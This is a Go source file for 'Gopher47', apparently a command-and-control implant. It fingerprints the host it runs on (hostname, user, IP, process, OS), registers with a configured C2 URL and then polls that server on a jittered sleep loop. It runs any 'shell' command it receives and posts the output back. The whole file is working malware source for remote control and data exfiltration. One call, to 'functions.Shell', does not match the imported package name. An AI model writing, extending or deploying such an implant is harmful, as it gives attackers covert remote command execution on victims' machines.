package main

import (
	"bytes"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"math/rand"
	"net/http"
	"os"
	"os/user"
	"strconv"
	"strings"
	"time"

	"github.com/An00bRektn/gopher47/pkg/agentfuncs"
	"github.com/An00bRektn/gopher47/pkg/utils"
	"github.com/elastic/go-sysinfo"
)

// Globals
// Only HTTP for now
var c = utils.GetConfig()
var url = c.Url
var sleepTime = c.SleepTime
var jitterRange = c.JitterRange
var magicBytes = []byte("\x63\x61\x66\x65")
// agentId set in main() because random seeding
var agentId = ""

func checkError(e error){
	if e != nil {
		panic(e)
	}
}

func genHeader(length int) string {
	var letters = []rune("abcdefghijklmnopqrstuvwxyz")
    header := make([]rune, length)
    for i := range header {
        header[i] = letters[rand.Intn(len(letters))]
    }
    return string(header)
}

func registerAgent(url string, magic []byte, agentId string) string{
	host, err := sysinfo.Host()
	hostInfo := host.Info()
	checkError(err)
	proc, _ := sysinfo.Self()
	procInfo, _ := proc.Info()

	hostname := hostInfo.Hostname
	currentuser, _ := user.Current()
	procPath, _ := os.Executable()

	registerDict := map[string]string{
		"AgentID": agentId,
		"Hostname": hostname,
		"Username": currentuser.Username,
		"Domain": "",
		"InternalIP": strings.Split(hostInfo.IPs[2], "/")[0],
		"Process Path": procPath,
		"Process ID": strconv.Itoa(procInfo.PID),
		"Process Parent ID": strconv.Itoa(procInfo.PPID),
		"Process Arch": "x64",
		"Process Elevated": "0",
		"OS Build": hostInfo.OS.Build,
		"OS Arch": hostInfo.Architecture,
		"Sleep": strconv.Itoa(c.SleepTime),
		"Process Name": procInfo.Name,
		"OS Version": hostInfo.OS.Name + " " + hostInfo.OS.Version,
	}

	dat, _ := json.Marshal(registerDict)
	requestDat := `{"task":"register","data":` + string(dat) + "}"

	// https://stackoverflow.com/questions/16888357/convert-an-integer-to-a-byte-array
	size := len(requestDat)+12
	sizeBytes := make([]byte, 4)
	binary.BigEndian.PutUint32(sizeBytes, uint32(size))

	// https://stackoverflow.com/questions/8461462/how-can-i-use-go-append-with-two-byte-slices-or-arrays
	// agentHeader = sizeBytes + magicBytes + agentId
	agentHeader := append(sizeBytes, magic...)
	agentHeader = append(agentHeader, []byte(agentId)...)

	// TODO: Try some amount of times then just exit
	// https://stackoverflow.com/questions/24455147/how-do-i-send-a-json-string-in-a-post-request-in-go
	req, err := http.NewRequest("POST", url, bytes.NewBuffer(append(agentHeader, []byte(requestDat)...)))
	checkError(err)
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("Content-Length", strconv.Itoa(size))

	client := &http.Client{}
    res, err := client.Do(req)
	if (err != nil){
		return "failed"
	}
    defer res.Body.Close()

	resBody, _ := ioutil.ReadAll(res.Body)
	if (string(resBody) == "" || resBody == nil) {
		return "failed"
	}

	return string(resBody)
}

func checkIn(dat string, checkInType string) string{
	requestDat := `{"task":"`+checkInType+`","data":"` + string(dat) + `"}`

	// https://stackoverflow.com/questions/16888357/convert-an-integer-to-a-byte-array
	size := len(requestDat)+12
	sizeBytes := make([]byte, 4)
	binary.BigEndian.PutUint32(sizeBytes, uint32(size))

	// https://stackoverflow.com/questions/8461462/how-can-i-use-go-append-with-two-byte-slices-or-arrays
	// agentHeader = sizeBytes + magicBytes + agentId
	agentHeader := append(sizeBytes, magicBytes...)
	agentHeader = append(agentHeader, []byte(agentId)...)

	// https://stackoverflow.com/questions/24455147/how-do-i-send-a-json-string-in-a-post-request-in-go
	req, err := http.NewRequest("POST", url, bytes.NewBuffer(append(agentHeader, []byte(requestDat)...)))
	checkError(err)
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("Content-Length", strconv.Itoa(size))

	client := &http.Client{}
    res, err := client.Do(req)
    checkError(err)
    defer res.Body.Close()

	resBody, _ := ioutil.ReadAll(res.Body)
	return string(resBody)
}

func RunCommand(command string) string {
	output := ""
	//fmt.Printf(" [*] Command: ")
	//fmt.Println([]byte(command))
	val := strings.Split(command, " ")[0]
	//fmt.Println([]byte(val))
	switch (val){
	case "shell":
		cmdArgs := strings.Fields(command)
		output = functions.Shell(cmdArgs[1:])
	case "o7":
		os.Exit(2)
	}

	return output
}

func main(){
	rand.Seed(time.Now().UnixNano())
	agentId = genHeader(4)

	// Attempt to register
	registered := "failed"
	for registered == "failed"{
		registered = registerAgent(url, magicBytes, agentId)
		time.Sleep((time.Duration(5) * time.Second))
	}
	fmt.Println("[+] Gopher47 has checked in!")

	command := ""
	out := ""
	r := 1
	// Begin execution
	for {
		command = checkIn("", "gettask")
		if (len(command) > 4) {
			fmt.Println("[*] New Task: " + command)
			out = RunCommand(utils.Strip(command[4:]))
			checkIn(utils.JsonEscape(out), "commandoutput")
		}
		r = rand.Intn(jitterRange)
		time.Sleep((time.Duration(sleepTime) * time.Second) + (time.Duration(r) * time.Microsecond))
	}
}
